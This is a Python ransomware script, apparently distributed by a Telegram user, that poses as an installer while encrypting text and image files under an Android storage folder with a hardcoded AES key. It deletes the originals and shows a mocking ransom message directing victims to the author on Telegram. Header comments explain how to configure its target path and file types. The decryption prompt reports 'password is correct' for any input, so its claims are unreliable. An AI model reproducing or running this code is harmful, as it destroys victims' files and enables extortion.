############################
##                Telegram : @esfelurm				    ##
##In line 16 give a main route, or don't touch ##
##Enter the formats in line 55 png,txt,jpg...  ##
##Enter the password in line 17 (as a hash)     ##
##Use the following tool to hash the password##
##https://github.com/esfelurm/hashing !      ##
##                Telegram : @esfelurm				 	##
############################
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
main_path = '/sdcard/علوم'
encryption_key = b'63eefbd45d89e8c91f24b609f7539942'
os.system("clear")
print (f"""{lrd}
 ___ _   _ ____ _____  _    _     _
|_ _| \ | / ___|_   _|/ \  | |   | |
 | ||  \| \___ \ | | / _ \ | |   | |
 | || |\  |___) || |/ ___ \| |___| |___
|___|_| \_|____/ |_/_/   \_\_____|_____|

{lrd}[{lgn}+{lrd}] {cn}Installing prerequisites ... 
""")
def encrypt_file(file_path, key):
    block_size = AES.block_size
    cipher = AES.new(key, AES.MODE_ECB)
    with open(file_path, 'rb') as file:
        data = file.read()
        if len(data) % block_size != 0:
            data = pad(data, block_size)
        encrypted_data = cipher.encrypt(data)
        encrypted_file_path = file_path + '.virus'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(file_path)

def decrypt_file(file_path, key):
    block_size = AES.block_size
    cipher = AES.new(key, AES.MODE_ECB)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        decrypted_file_path = file_path[:-6]  
        with open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)
        os.remove(file_path)

def find_and_encrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.txt', '.nopolo', 'jpg')):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

def find_and_decrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith('.virus'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)

def find_android_directories(path):
    android_directories = []
    for root, dirs, _ in os.walk(path):
        for directory in dirs:
            android_directories.append(os.path.join(root, directory))
    return android_directories

android_directories = find_android_directories(main_path)

for directory in android_directories:
    find_and_encrypt_files(directory, encryption_key)
os.system("clear")
print (f"""                                                                                                                                                                                
 {lrd}                                                           
              :-====--:.            .:-=====-.              
           :+************+=-:  :-=+************=.           
         .+****++************.-************++****+.         
        .*+-.     .+*********.-*********=.     .-**.        
        +:          -********.-********-          -=        
       :=            =*******.-*******-            =:       
      ***+            *******.-******+            ****      
      -++:            -++++++.:++++++:            -++:      
{rd}                      :==============:                      
{lgn}                                                            
                        =.        --                        
                      .-*+:     .:++:.                      
                        :         ..                        
                            {yw}-**=           {lgn}                 
                       =:   {yw}=**=   {lgn}-=                       
                       -*+-.    .-**:                       
                         :=+***++=:                                                                                                                                                                                                                                             
{lrd}[{lgn}♡{lrd}] {be}Ha ha ha.... {pe}All your files are encrypted, you can send a message to the manufacturer to get back : {yw}@Esfelurm                                                                                                   
""")
decryption_key_str = input(f"\n{lrd}[{lgn}?{lrd}] {cn}Enter the decryption key: ")
	#exit()
try:
    decryption_key = decryption_key_str.encode()
    print (f"\n\n{lrd}[{lgn}!{lrd}] {lgn}The password is correct! please wait ...")
    for directory in android_directories:
    	find_and_decrypt_files(directory,decryption_key)
except:
	print (f"\n\n{lrd}[{lgn}!{lrd}] {lrd}The password is wrong! Please talk to Mr. Esfelurm or admin ")
